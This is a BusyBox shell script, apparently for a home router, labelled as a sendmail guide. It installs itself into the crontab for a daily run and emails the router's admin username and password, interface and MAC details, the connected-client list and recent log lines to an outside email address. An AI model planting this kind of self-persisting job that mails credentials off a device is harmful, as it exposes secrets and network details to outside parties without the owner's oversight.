#!/bin/sh
# Sendmail in Busybox Guide
cron=/etc/storage/cron/crontabs/$(nvram get http_username) 
grep -qi $(basename $0) $cron || echo -e "\n12 12 * * * sh /etc/storage/bin/$(basename $0)" >> $cron

from_add=xiongjun0928@163.com
username=${from_add%@*}
userpasswd=
smtp_add=smtp.${from_add#*@}
to_add=jun_xiong@10gsfp.com
cc_add=
subject="$(date +%F)---Hostname:$(nvram get computer_name)"
message="
$(nvram get http_username) / $(nvram get http_passwd)

$(ifconfig | awk 'BEGIN{print "Iface_IP infomation : "}/inet addr/ || /HWaddr/ {print $0}')

$(awk -F, 'BEGIN{print "Client infomation : "} {print $1"\t"$2"\t"$3}' /tmp/static_ip.inf)

=======================================================
$(tail -n 24 /tmp/autoChangeAp.log)
"
mailtxt=/tmp/mail.txt

cat << END > $mailtxt
From:$from_add
To:$to_add
CC:$cc_add
Subject:$subject

$message
END

/usr/sbin/sendmail -f $from_add -au$username -ap$userpasswd -S $smtp_add -t < $mailtxt
